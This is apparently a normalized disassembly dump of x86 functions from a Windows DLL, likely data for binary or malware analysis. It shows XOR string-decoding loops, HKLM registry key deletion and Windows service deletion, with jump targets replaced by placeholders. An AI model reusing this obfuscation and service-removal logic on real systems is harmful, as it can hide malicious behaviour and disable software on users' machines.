movsx esi [ edx + eax ]
xor esi eax
xor esi 0x6b
and esi 0xff
mov [ ebp + eax * 2 - 0x58 ] si
inc eax
cmp eax 0x24
jb r-xdata
xor edx edx
lea eax [ ebp - 0x58 ]
mov [ ebp - 0x10 ] dx
push eax
lea edx [ ebp - 0xa8 ]
call sub_10042070
mov ecx [ ebp - 0x4 ]
add esp 0x4
neg eax
sbb eax eax
xor ecx ebp
neg eax
pop esi
call sub_10024145
mov esp ebp
pop ebp
retn
sub_1000a77b
push 0x28
mov eax sub_1007f332
call sub_100097c8
and [ ebp - 0x10 ] 0x0
mov ebx [ ebp + 0x8 ]
test ebx ebx
je r-xdata
push 0x4
pop eax
call sub_1004db01
retn
cmp [ ebx ] 0x0
jne r-xdata
push 0x18
call sub_10055606
mov esi eax
pop ecx
mov [ ebp + 0x8 ] esi
and [ ebp - 0x4 ] 0x0
test esi esi
je r-xdata
xor esi esi
mov eax [ ebp + 0xc ]
mov eax [ eax ]
mov ecx [ eax + 0x18 ]
test ecx ecx
jne r-xdata
lea ecx [ ebp - 0x34 ]
call sub_10039680
push ecx
lea ecx [ ebp - 0x34 ]
call sub_1004d460
and [ esi + 0x4 ] 0x0
xor ecx ecx
inc ecx
mov [ ebp - 0x10 ] ecx
push ecx
push eax
mov ecx esi
mov [ ebp - 0x4 ] 0x2
mov [ esi ] r--data
call sub_100557be
jmp r-xdata
lea ecx [ eax + 0x1c ]
or [ ebp - 0x4 ] 0xffffffff
test [ ebp - 0x10 ] 0x1
mov [ ebx ] esi
je r-xdata
sub_1000a810
push ebp
mov ebp esp
sub esp 0xa8
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebx
push esi
push edi
xor ebx ebx
lea edi [ ebp - 0xa0 ]
lea edx [ ebp - 0xa4 ]
mov esi ecx
mov [ ebp - 0xa8 ] eax
mov [ ebp - 0xa4 ] ebx
mov [ ebp - 0xa0 ] ebx
call sub_1002ae80
test eax eax
je r-xdata
lea edx [ ebp - 0x1c ]
mov eax 0x97
mov [ ebp - 0x9c ] ebx
call sub_100050e0
lea ecx [ ebp - 0x9c ]
push ecx
push edx
call sub_100283d0
add esp 0x8
test eax eax
je r-xdata
lea edx [ ebp - 0x98 ]
lea eax [ ebx + 0x30 ]
call sub_100050e0
mov ebx 0x1
jmp r-xdata
push 0x10
push ebx
call [ GetProcessHeap@IAT ]
push eax
call [ HeapAlloc@IAT ]
mov esi eax
cmp esi ebx
je r-xdata
lea edx [ ebp - 0x84 ]
mov eax 0x61
call sub_100050e0
mov edx [ ebp - 0xa4 ]
mov esi [ SysFreeString@IAT ]
push edx
call esi
mov eax [ ebp - 0xa0 ]
push eax
call esi
mov ecx [ ebp - 0x9c ]
push ecx
call esi
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
mov eax ebx
xor ecx ebp
pop ebx
call sub_10024145
mov esp ebp
pop ebp
retn 0x4
xor eax eax
mov eax [ ebp - 0x9c ]
push eax
call sub_10055686
mov edx [ ebp - 0xa0 ]
mov ecx [ ebp - 0xa4 ]
add esp 0x4
push eax
call sub_1000ac20
jmp r-xdata
mov ecx [ ebp - 0xa8 ]
mov [ ecx ] eax
sub_1000a920
push ebp
mov ebp esp
mov eax [ ebp + 0x10 ]
mov ecx [ ebp + 0xc ]
mov edx [ ebp + 0x8 ]
push esi
push eax
push ecx
push edx
call sub_10033049
mov esi eax
add esp 0xc
cmp esi 0xffffffff
jne r-xdata
pop esi
pop ebp
retn 0x10
call sub_1004fd6f
mov eax [ eax ]
mov ecx [ ebp + 0x14 ]
mov [ ecx ] eax
mov eax esi
sub_1000a952
mov edi edi
push esi
push edi
mov edi rw-data
add edi 0x4
cmp edi rw-data
jl r-xdata
lea ecx [ eax + 0x800 ]
cmp eax ecx
jae r-xdata
mov eax [ edi ]
test eax eax
je r-xdata
pop edi
pop esi
retn
push [ edi ]
call sub_10022b5a
and [ edi ] 0x0
pop ecx
lea esi [ eax + 0xc ]
mov eax [ edi ]
add esi 0x40
add eax 0x800
lea ecx [ esi - 0xc ]
cmp ecx eax
jb r-xdata
push esi
call [ DeleteCriticalSection@IAT ]
cmp [ esi - 0x4 ] 0x0
je r-xdata
sub_1000a9a5
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
mov eax [ rw-data ]
and [ ebp - 0x8 ] 0x0
and [ ebp - 0x4 ] 0x0
push ebx
push edi
mov edi 0xbb40e64e
mov ebx 0xffff0000
cmp eax edi
je r-xdata
push esi
lea eax [ ebp - 0x8 ]
push eax
call [ GetSystemTimeAsFileTime@IAT ]
mov esi [ ebp - 0x4 ]
xor esi [ ebp - 0x8 ]
call [ GetCurrentProcessId@IAT ]
xor esi eax
call [ GetCurrentThreadId@IAT ]
xor esi eax
call [ GetTickCount@IAT ]
xor esi eax
lea eax [ ebp - 0x10 ]
push eax
call [ QueryPerformanceCounter@IAT ]
mov eax [ ebp - 0xc ]
xor eax [ ebp - 0x10 ]
xor esi eax
cmp esi edi
jne r-xdata
test ebx eax
je r-xdata
test ebx esi
jne r-xdata
mov esi 0xbb40e64f
jmp r-xdata
not eax
mov [ rw-data ] eax
jmp r-xdata
mov [ rw-data ] esi
not esi
mov [ rw-data ] esi
pop esi
mov eax esi
or eax 0x4711
shl eax 0x10
or esi eax
pop edi
pop ebx
leave
retn
sub_1000aa50
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_1003eba0
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_1006591f
add esp 0x4
sub_1000aa80
push ebp
mov ebp esp
sub esp 0x6c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov ecx [ r--data ]
push esi
xor eax eax
lea esp [ esp ]
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0xffe2
and edx 0xff
mov [ ebp + eax * 2 - 0x1c ] dx
inc eax
cmp eax 0xb
jb r-xdata
xor eax eax
lea edx [ ebp - 0x68 ]
push edx
mov [ ebp - 0x6 ] ax
mov [ ebp - 0x68 ] eax
mov eax [ edi + 0x1c ]
mov ecx [ eax ]
lea edx [ ebp - 0x1c ]
push edx
push eax
mov eax [ ecx + 0x94 ]
call eax
test eax eax
jne r-xdata
lea edx [ ebp - 0x60 ]
mov eax 0x88
call sub_100050e0
mov esi [ ebp - 0x68 ]
call sub_1004df80
mov esi eax
mov eax [ ebp - 0x68 ]
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
test esi esi
je r-xdata
mov esi [ edi + 0x12c ]
test esi esi
je r-xdata
mov eax 0x1
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn
mov eax [ edi + 0x1c ]
lea edx [ ebp - 0x64 ]
push edx
lea edx [ ebp - 0x1c ]
mov [ ebp - 0x64 ] 0x0
mov ecx [ eax ]
push edx
push eax
mov eax [ ecx + 0x94 ]
call eax
test eax eax
je r-xdata
mov eax [ ebp - 0x64 ]
mov edx [ eax ]
push eax
mov eax [ edx + 0x8 ]
call eax
mov ecx [ ebp - 0x4 ]
xor ecx ebp
xor eax eax
pop esi
call sub_10024145
mov esp ebp
pop ebp
retn
mov edx [ esi ]
lea ecx [ ebp - 0x64 ]
push ecx
mov ecx edi
call sub_1001f320
mov esi [ esi + 0x4 ]
test esi esi
jne r-xdata
sub_1000ab75
mov edi edi
push ebp
mov ebp esp
inc [ rw-data ]
push 0x1000
call sub_10008102
pop ecx
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x8 ] eax
test eax eax
je r-xdata
or [ ecx + 0xc ] 0x4
lea eax [ ecx + 0x14 ]
mov [ ecx + 0x8 ] eax
mov [ ecx + 0x18 ] 0x2
or [ ecx + 0xc ] 0x8
mov [ ecx + 0x18 ] 0x1000
jmp r-xdata
mov eax [ ecx + 0x8 ]
and [ ecx + 0x4 ] 0x0
mov [ ecx ] eax
pop ebp
retn
sub_1000abc0
push ebp
mov ebp esp
push esi
mov esi ecx
mov ecx [ ebp + 0x8 ]
xor eax eax
push ecx
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] 0x0
mov ecx esi
mov [ esi ] ax
call sub_10036380
mov eax esi
pop esi
pop ebp
retn 0x4
sub_1000abf0
push ebp
mov ebp esp
test [ ebp + 0x8 ] 0x1
push esi
mov esi ecx
mov [ esi ] r--data
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_1006591f
add esp 0x4
sub_1000ac20
push ebp
mov ebp esp
sub esp 0x28
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebx
push edi
mov edi ecx
xor ecx ecx
mov ebx edx
mov [ ebp - 0x28 ] ebx
mov [ esi + 0x4 ] ecx
mov [ esi + 0x8 ] ecx
mov [ esi ] r--data
mov [ esi + 0xc ] eax
cmp edi ecx
je r-xdata
lea edx [ ebp - 0x20 ]
mov eax 0x3d
call sub_100050e0
mov eax ecx
cmp eax ecx
je r-xdata
lea edx [ ebp - 0x24 ]
mov eax 0x82
call sub_100050e0
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
mov eax esi
pop ebx
call sub_10024145
mov esp ebp
pop ebp
retn 0x4
mov eax [ esi + 0x8 ]
test eax eax
je r-xdata
push edi
call [ lstrlenW@IAT ]
lea ebx [ eax + eax ]
lea ecx [ ebx + 0x2 ]
push ecx
push 0x40
call [ LocalAlloc@IAT ]
push ebx
push edi
push eax
mov [ esi + 0x4 ] eax
call sub_100796a0
mov ebx [ ebp - 0x28 ]
add esp 0xc
jmp r-xdata
push eax
call [ LocalFree@IAT ]
mov [ esi + 0x4 ] 0x0
push ebx
call [ lstrlenW@IAT ]
lea edi [ eax + eax ]
lea edx [ edi + 0x2 ]
push edx
push 0x40
call [ LocalAlloc@IAT ]
push edi
push ebx
push eax
mov [ esi + 0x8 ] eax
call sub_100796a0
add esp 0xc
pop edi
mov eax esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn 0x4
push eax
call [ LocalFree@IAT ]
mov [ esi + 0x8 ] 0x0
test ebx ebx
je r-xdata
sub_1000ad10
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
sub esp 0xc
xor eax eax
test ecx ecx
je r-xdata
mov esp ebp
pop ebp
retn 0x4
cmp ecx 0x7fffffff
ja r-xdata
lea ecx [ ebp + 0x8 ]
push ecx
lea ecx [ ebp - 0xc ]
mov [ ebp + 0x8 ] 0x0
call sub_10008757
push r--data
lea edx [ ebp - 0xc ]
push edx
mov [ ebp - 0xc ] r--data
call sub_1000bd19
lea eax [ ecx + ecx ]
push eax
call sub_10055606
add esp 0x4
test eax eax
jne r-xdata
sub_1000ad70
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0xc ]
mov eax edi
lea edx [ eax + 0x1 ]
lea ecx [ ecx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx ]
sub eax edx
mov edx [ ecx + 0x8 ]
inc eax
push eax
mov eax [ ecx ]
push edx
call eax
mov esi eax
add esp 0x8
mov ecx edi
sub esi edi
mov dl [ ecx ]
mov [ esi + ecx ] dl
inc ecx
test dl dl
jne r-xdata
pop edi
pop esi
pop ebp
retn
sub_1000adb0
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0x8 ]
mov esi ecx
cmp esi edi
je r-xdata
pop edi
mov eax esi
pop esi
pop ebp
retn 0x4
cmp [ esi + 0x14 ] 0x10
jb r-xdata
mov [ esi + 0x14 ] 0xf
mov [ esi + 0x10 ] 0x0
mov [ esi ] 0x0
cmp [ edi + 0x14 ] 0x10
jae r-xdata
mov eax [ esi ]
push eax
call sub_1006591f
add esp 0x4
mov edx [ edi ]
mov [ esi ] edx
mov [ edi ] 0x0
mov ecx [ edi + 0x10 ]
inc ecx
push ecx
push edi
push esi
call sub_10078db0
add esp 0xc
jmp r-xdata
mov eax [ edi + 0x10 ]
mov [ esi + 0x10 ] eax
mov ecx [ edi + 0x14 ]
mov [ esi + 0x14 ] ecx
mov [ edi + 0x14 ] 0xf
mov [ edi + 0x10 ] 0x0
mov [ edi ] 0x0
sub_1000ae30
push ebp
mov ebp esp
push esi
push edi
push 0x324
push 0x0
push ebx
call sub_10079a10
mov esi [ ebp + 0xc ]
lea edi [ ebx + 0x122 ]
mov ecx 0x40
[ edi ] [ esi ]
mov edi [ ebp + 0x10 ]
mov eax edi
add esp 0xc
lea esi [ eax + 0x1 ]
lea ecx [ ecx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax esi
mov esi [ ebp + 0x8 ]
push eax
add esi 0x20
push edi
mov ecx esi
call sub_10043190
xor eax eax
mov [ ebx + 0x8 ] eax
mov [ ebx + 0xc ] eax
mov [ ebx + 0x10 ] eax
mov ax [ ebp + 0x14 ]
mov edi 0x1
mov [ ebx ] 0x7fffffff
mov [ ebx + 0x4 ] 0x7fffffff
mov [ ebx + 0x14 ] edi
mov [ ebx + 0x18 ] edi
mov [ ebx + 0x20 ] ax
cmp [ esi + 0x14 ] 0x10
jb r-xdata
push edi
push esi
lea edx [ ebx + 0x122 ]
call sub_100514f0
mov ecx [ ebx + 0x14 ]
mov edx [ ebp + 0x8 ]
add esp 0x8
mov eax edi
pop edi
mov [ edx + 0x380 ] ecx
pop esi
pop ebp
retn 0x10
mov esi [ esi ]
sub_1000aecf
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x0
push esi
push edi
mov edi [ ebp + 0xc ]
mov esi ecx
je r-xdata
mov [ esi + 0x10 ] edi
mov [ esi + 0x14 ] 0x7
xor eax eax
mov [ esi + edi * 2 ] ax
pop edi
pop esi
pop ebp
retn 0x8
cmp [ esi + 0x14 ] 0x8
jb r-xdata
push ebx
mov ebx [ esi ]
test edi edi
je r-xdata
push ebx
call sub_1006591f
pop ecx
pop ebx
lea eax [ edi + edi ]
push eax
push ebx
push esi
call sub_100796a0
add esp 0xc
sub_1000af2e
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
cmp esi [ ebp + 0xc ]
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x8
push edi
lea edi [ ecx + 0x8 ]
movzx eax [ esi ]
push edi
push eax
call sub_1000d161
mov [ esi ] ax
add esi 0x2
pop ecx
pop ecx
cmp esi [ ebp + 0xc ]
jne r-xdata
pop edi
sub_1000af60
push ebp
mov ebp esp
sub esp 0x1c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
xor ebx ebx
push edi
mov [ esi + 0xda0 ] ebx
mov [ esi + 0xda4 ] ebx
mov [ esi + 0xda8 ] ebx
push 0x11c
mov [ esi + 0xdb0 ] ebx
mov [ esi + 0xdb4 ] ebx
mov [ esi + 0xdb8 ] ebx
lea edi [ esi + 0x4 ]
push ebx
push edi
mov [ esi + 0xdc0 ] ebx
mov [ esi + 0xdc4 ] ebx
call sub_10079a10
add esp 0xc
push edi
mov [ edi ] 0x11c
call [ GetVersionExW@IAT ]
call [ GetProcessHeap@IAT ]
push 0x104
mov [ esi ] eax
lea eax [ esi + 0x73c ]
push ebx
push eax
call sub_10079a10
push 0x104
lea ecx [ esi + 0x944 ]
push ebx
push ecx
call sub_10079a10
push 0x104
lea edx [ esi + 0xb4c ]
push ebx
push edx
call sub_10079a10
xor eax eax
mov [ esi + 0xd5c ] eax
mov [ esi + 0xd60 ] eax
mov [ esi + 0xd64 ] eax
mov [ esi + 0xd68 ] eax
mov [ esi + 0xd7c ] eax
mov [ esi + 0xd80 ] eax
push 0x104
mov [ esi + 0xd84 ] eax
lea edi [ esi + 0x534 ]
push ebx
mov [ esi + 0xd88 ] eax
push edi
mov [ esi + 0xd8c ] ax
call sub_10079a10
push 0x104
lea eax [ esi + 0x124 ]
push ebx
push eax
call sub_10079a10
push 0x104
lea eax [ esi + 0x32c ]
push ebx
push eax
call sub_10079a10
mov eax [ ebp + 0x8 ]
add esp 0x48
mov [ esi + 0xd54 ] ebx
mov [ esi + 0xd58 ] ebx
cmp eax ebx
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
mov eax esi
pop ebx
call sub_10024145
mov esp ebp
pop ebp
retn 0x4
mov [ esi + 0x120 ] eax
cmp [ eax + 0x1596c ] 0x1
jne r-xdata
lea ecx [ eax + 0xc4 ]
sub ecx edi
mov edx 0x104
mov eax edi
mov [ ebp - 0x1c ] ecx
jmp r-xdata
lea edi [ edx + 0x7ffffefa ]
test edi edi
je r-xdata
cmp edx ebx
jne r-xdata
movzx ecx [ ecx + eax ]
cmp cx bx
je r-xdata
xor ecx ecx
mov [ eax ] cx
lea edx [ ebp - 0x18 ]
lea eax [ ecx + 0x1a ]
call sub_10015360
push 0x104
lea eax [ esi + 0x32c ]
push eax
push edx
call [ ExpandEnvironmentStringsW@IAT ]
sub eax 0x2
mov [ eax ] cx
add eax 0x2
dec edx
jne r-xdata
mov ecx [ ebp - 0x1c ]
jmp r-xdata
sub_1000b110
push ebp
mov ebp esp
sub esp 0x14
mov ecx [ ebp + 0xc ]
xor eax eax
mov [ ebp - 0x8 ] eax
cmp [ ecx ] eax
jbe r-xdata
mov esp ebp
pop ebp
retn
push esi
mov esi edx
sub esi ebx
push edi
mov [ ebp - 0x10 ] esi
mov [ ebp - 0x4 ] eax
jmp r-xdata
mov edx 0x104
mov eax ebx
mov edi edi
test edx edx
jne r-xdata
movzx ecx [ esi + eax ]
test cx cx
je r-xdata
xor edx edx
mov [ eax ] dx
mov eax [ ebp + 0x1c ]
mov ecx [ eax ]
mov edx [ ebp - 0x4 ]
mov edi [ edx + ecx ]
mov eax 0x104
mov ecx ebx
lea esp [ esp ]
sub eax 0x2
mov [ eax ] cx
add eax 0x2
dec edx
jne r-xdata
test eax eax
je r-xdata
add ecx 0x2
dec eax
jne r-xdata
lea ecx [ edx + 0x7ffffefa ]
test ecx ecx
je r-xdata
jmp r-xdata
lea edx [ ebp - 0xc ]
push edx
push 0x20119
push 0x0
push ebx
push 0x80000002
call [ RegOpenKeyExW@IAT ]
test eax eax
jne r-xdata
mov edx 0x104
sub edx eax
mov ecx 0x104
sub ecx edx
lea eax [ ebx + edx * 2 ]
je r-xdata
cmp [ ecx ] 0x0
je r-xdata
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov ecx [ ebp + 0xc ]
add [ ebp - 0x4 ] 0x2c
inc eax
mov [ ebp - 0x8 ] eax
cmp eax [ ecx ]
jb r-xdata
mov edi [ ebp + 0x10 ]
mov ecx [ ebp + 0x20 ]
mov edx [ ebp - 0xc ]
lea eax [ ebp - 0x14 ]
push eax
push edi
push 0x0
push 0x0
push ecx
push edx
mov [ ebp - 0x14 ] 0x208
call [ RegQueryValueExW@IAT ]
mov esi eax
test esi esi
je r-xdata
sub eax 0x2
lea esi [ ecx + edx + 0x7ffffefb ]
sub edi eax
mov edi edi
mov esi [ ebp - 0x10 ]
pop edi
pop esi
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0xc ]
push eax
call [ RegCloseKey@IAT ]
test esi esi
jne r-xdata
mov esi 0x2
test ecx ecx
jne r-xdata
movzx edx [ edi + eax ]
test dx dx
je r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
push edx
push edi
call [ StrStrW@IAT ]
test eax eax
jne r-xdata
xor ecx ecx
mov [ eax ] cx
mov [ eax ] dx
add eax 0x2
dec esi
dec ecx
jne r-xdata
push ebx
push 0x80000002
call [ RegDeleteKeyW@IAT ]
mov eax [ ebp - 0x8 ]
mov edx [ ebp + 0x1c ]
imul eax eax 0x2c
mov ecx [ edx ]
mov edx [ eax + ecx ]
mov eax [ ebp + 0x18 ]
mov ecx [ eax ]
push 0xf01ff
push edx
push ecx
call [ OpenServiceW@IAT ]
mov esi eax
push esi
call [ DeleteService@IAT ]
mov edx [ ebp + 0x14 ]
push esi
mov [ edx ] eax
call [ CloseServiceHandle@IAT ]
pop edi
pop esi
test esi esi
je r-xdata
jmp r-xdata
sub_1000b29e
push 0x28
mov eax sub_1007f6b0
call sub_100097c8
xor ebx ebx
mov [ ebp - 0x10 ] ebx
mov edi [ ebp + 0x8 ]
cmp edi ebx
je r-xdata
push 0x3
pop eax
call sub_1004db01
retn
cmp [ edi ] ebx
jne r-xdata
push 0x34
call sub_10055606
mov esi eax
pop ecx
mov [ ebp + 0x8 ] esi
mov [ ebp - 0x4 ] ebx
cmp esi ebx
je r-xdata
xor esi esi
mov eax [ ebp + 0xc ]
mov eax [ eax ]
mov ecx [ eax + 0x18 ]
cmp ecx ebx
je r-xdata
lea ecx [ ebp - 0x34 ]
call sub_10039680
add eax 0x1c
mov eax ecx
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
test [ ebp - 0x10 ] 0x1
mov [ edi ] esi
je r-xdata
push eax
lea ecx [ ebp - 0x34 ]
call sub_1004d460
xor ecx ecx
inc ecx
mov [ ebp - 0x10 ] ecx
mov [ esi + 0x4 ] ebx
push ecx
push eax
mov ecx esi
mov [ ebp - 0x4 ] 0x2
mov [ esi ] r--data
mov [ esi + 0x28 ] bl
call sub_10059c54
mov [ esi ] r--data
jmp r-xdata
sub_1000b333
push 0xc
mov eax sub_1007fbb8
call sub_100097c8
xor ebx ebx
mov [ ebp - 0x14 ] ebx
mov eax [ ebp + 0xc ]
and eax 0x2
mov [ ebp - 0x14 ] eax
je r-xdata
mov edi [ ebp + 0xc ]
and edi 0x8
je r-xdata
cmp [ ebp + 0x14 ] ebx
jne r-xdata
cmp edi ebx
je r-xdata
cmp [ ebp + 0x14 ] ebx
jne r-xdata
mov ecx rw-data
call sub_10015f10
push [ ebp + 0x14 ]
mov esi eax
call sub_10033ef0
push esi
push eax
push [ ebp + 0x10 ]
call sub_1000710e
add esp 0x10
push 0x20
call sub_10055606
mov esi eax
pop ecx
cmp esi ebx
je r-xdata
mov edi [ ebp + 0x14 ]
cmp [ ebp + 0x14 ] ebx
jne r-xdata
mov ecx rw-data
call sub_10015f10
push [ ebp + 0x14 ]
mov esi eax
call sub_1005e4dd
push esi
push eax
push [ ebp + 0x10 ]
call sub_1000710e
add esp 0x10
push 0x10
call sub_10055606
mov esi eax
pop ecx
cmp esi ebx
je r-xdata
xor esi esi
push [ ebp + 0x8 ]
mov ecx esi
mov [ esi + 0x4 ] ebx
mov [ esi ] r--data
call sub_10005213
jmp r-xdata
test [ ebp + 0xc ] 0x20
je r-xdata
cmp edi ebx
jne r-xdata
mov ecx rw-data
call sub_10015f10
push [ ebp + 0x14 ]
mov esi eax
call sub_10055569
push esi
push eax
push [ ebp + 0x10 ]
call sub_1000710e
add esp 0x10
push 0x10
call sub_10055606
mov esi eax
pop ecx
cmp esi ebx
je r-xdata
xor esi esi
mov [ esi + 0x4 ] ebx
mov [ esi ] r--data
call sub_1000a66f
mov [ esi + 0x8 ] eax
mov [ esi + 0xc ] edx
jmp r-xdata
mov ecx rw-data
call sub_10015f10
push eax
push esi
push [ ebp + 0x10 ]
call sub_1000710e
add esp 0xc
jmp r-xdata
mov eax [ ebp + 0xc ]
and eax 0x4
mov [ ebp - 0x10 ] eax
je r-xdata
cmp edi ebx
jne r-xdata
mov ecx rw-data
call sub_10015f10
push edi
mov esi eax
call sub_10008d48
push esi
push eax
push [ ebp + 0x10 ]
call sub_1000710e
add esp 0x10
push 0x10
call sub_10055606
mov esi eax
pop ecx
cmp esi ebx
je r-xdata
mov edi [ ebp + 0x14 ]
cmp edi ebx
jne r-xdata
xor esi esi
mov [ esi + 0x4 ] ebx
mov [ esi ] r--data
call sub_1000a66f
mov [ esi + 0x8 ] eax
mov [ esi + 0xc ] edx
jmp r-xdata
mov ecx rw-data
call sub_10015f10
push eax
push esi
push [ ebp + 0x10 ]
call sub_1000710e
add esp 0xc
jmp r-xdata
cmp [ ebp - 0x10 ] ebx
je r-xdata
cmp edi ebx
jne r-xdata
mov ecx rw-data
call sub_10015f10
push edi
mov esi eax
call sub_1005e0ad
push esi
push eax
push [ ebp + 0x10 ]
call sub_1000710e
add esp 0x10
push 0x8
call sub_10055606
pop ecx
cmp eax ebx
je r-xdata
xor esi esi
mov [ esi + 0x4 ] ebx
mov [ esi ] r--data
call sub_10062816
mov [ esi + 0x8 ] eax
mov [ esi + 0xc ] edx
jmp r-xdata
mov ecx rw-data
call sub_10015f10
push edi
mov esi eax
call sub_1001fccb
push esi
push eax
push [ ebp + 0x10 ]
call sub_1000710e
add esp 0x10
jmp r-xdata
push 0x18
call sub_10055606
mov esi eax
pop ecx
mov [ ebp - 0x10 ] esi
mov [ ebp - 0x4 ] 0x7
cmp esi ebx
je r-xdata
cmp edi ebx
je r-xdata
mov ecx rw-data
call sub_10015f10
push eax
push esi
push [ ebp + 0x10 ]
call sub_1000710e
add esp 0xc
jmp r-xdata
mov edi r--data
cmp [ ebp - 0x10 ] ebx
je r-xdata
cmp edi ebx
jne r-xdata
mov ecx rw-data
call sub_10015f10
push edi
mov esi eax
call sub_10037201
push esi
push eax
push [ ebp + 0x10 ]
call sub_1000710e
add esp 0x10
push 0x10
call sub_10055606
mov esi eax
pop ecx
cmp esi ebx
je r-xdata
xor esi esi
mov [ eax + 0x4 ] ebx
mov [ eax ] r--data
mov esi eax
jmp r-xdata
mov ecx rw-data
call sub_10015f10
push eax
push esi
push [ ebp + 0x10 ]
call sub_1000710e
add esp 0xc
jmp r-xdata
push ebx
push ebx
call sub_1001124e
xor edx edx
pop ecx
inc edx
pop ecx
mov ecx eax
shl edx cl
sar edx 0x1
test [ ebp + 0xc ] edx
je r-xdata
xor esi esi
mov [ esi + 0x4 ] ebx
push ebx
push [ ebp + 0x8 ]
mov ecx esi
mov [ ebp - 0x4 ] 0x8
mov [ esi ] r--data
call sub_100557be
jmp r-xdata
mov edi [ ebp + 0xc ]
and edi 0x10
je r-xdata
cmp [ ebp + 0x14 ] ebx
jne r-xdata
mov ecx rw-data
call sub_10015f10
push edi
mov esi eax
call sub_100681b5
push esi
push eax
push [ ebp + 0x10 ]
call sub_1000710e
add esp 0x10
push 0x10
call sub_10055606
mov esi eax
pop ecx
cmp esi ebx
je r-xdata
xor esi esi
mov [ esi + 0x4 ] ebx
mov [ esi ] r--data
call sub_1000a66f
mov [ esi + 0x8 ] eax
mov [ esi + 0xc ] edx
jmp r-xdata
mov ecx rw-data
call sub_10015f10
push eax
push esi
push [ ebp + 0x10 ]
call sub_1000710e
add esp 0xc
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
mov ecx rw-data
call sub_10015f10
push eax
push esi
push [ ebp + 0x10 ]
call sub_1000710e
add esp 0xc
jmp r-xdata
cmp edi ebx
je r-xdata
cmp [ ebp + 0x14 ] ebx
jne r-xdata
mov ecx rw-data
call sub_10015f10
push [ ebp + 0x14 ]
mov esi eax
call sub_10030b33
push esi
push eax
push [ ebp + 0x10 ]
call sub_1000710e
add esp 0x10
push 0x34
call sub_10055606
mov esi eax
pop ecx
mov [ ebp - 0x18 ] esi
mov [ ebp - 0x4 ] 0x10
cmp esi ebx
je r-xdata
xor esi esi
mov [ esi + 0x4 ] ebx
mov [ esi ] r--data
call sub_1000a66f
mov [ esi + 0x8 ] eax
mov [ esi + 0xc ] edx
jmp r-xdata
mov ecx rw-data
call sub_10015f10
push eax
push esi
push [ ebp + 0x10 ]
call sub_1000710e
add esp 0xc
jmp r-xdata
cmp [ ebp - 0x14 ] ebx
je r-xdata
cmp [ ebp + 0x14 ] ebx
jne r-xdata
mov ecx rw-data
call sub_10015f10
push [ ebp + 0x14 ]
mov esi eax
call sub_10049f42
push esi
push eax
push [ ebp + 0x10 ]
call sub_1000710e
add esp 0x10
push 0x1c
call sub_10055606
pop ecx
mov ecx eax
mov [ ebp + 0xc ] ecx
mov [ ebp - 0x4 ] 0x1b
cmp ecx ebx
je r-xdata
cmp [ ebp + 0x14 ] ebx
jne r-xdata
xor esi esi
mov [ esi + 0x4 ] ebx
push ebx
push [ ebp + 0x8 ]
mov ecx esi
mov [ ebp - 0x4 ] 0x11
mov [ esi ] edi
mov [ esi + 0x28 ] bl
call sub_1004de1d
mov [ esi ] r--data
jmp r-xdata
mov ecx rw-data
call sub_10015f10
push eax
push esi
push [ ebp + 0x10 ]
call sub_1000710e
add esp 0xc
jmp r-xdata
call sub_1004db01
retn
cmp [ ebp + 0x14 ] ebx
jne r-xdata
mov ecx rw-data
call sub_10015f10
push [ ebp + 0x14 ]
mov esi eax
call sub_1005e23c
push esi
push eax
push [ ebp + 0x10 ]
call sub_1000710e
add esp 0x10
push 0x14
call sub_10055606
mov esi eax
pop ecx
cmp esi ebx
je r-xdata
xor esi esi
push ebx
push [ ebp + 0x8 ]
call sub_1004d73d
mov esi eax
jmp r-xdata
mov ecx rw-data
call sub_10015f10
push [ ebp + 0x14 ]
mov esi eax
call sub_100018ed
push esi
push eax
push [ ebp + 0x10 ]
call sub_1000710e
add esp 0x10
push 0x34
call sub_10055606
mov esi eax
pop ecx
mov [ ebp - 0x18 ] esi
mov [ ebp - 0x4 ] 0x16
cmp esi ebx
je r-xdata
cmp [ ebp - 0x10 ] ebx
je r-xdata
or [ ebp - 0x4 ] 0xffffffff
mov ecx rw-data
call sub_10015f10
push eax
push esi
push [ ebp + 0x10 ]
call sub_1000710e
add esp 0xc
jmp r-xdata
mov ecx rw-data
call sub_10015f10
push [ ebp + 0x14 ]
mov esi eax
call sub_10010cd5
push esi
push eax
push [ ebp + 0x10 ]
call sub_1000710e
add esp 0x10
push 0x10
call sub_10055606
mov esi eax
pop ecx
cmp esi ebx
je r-xdata
xor esi esi
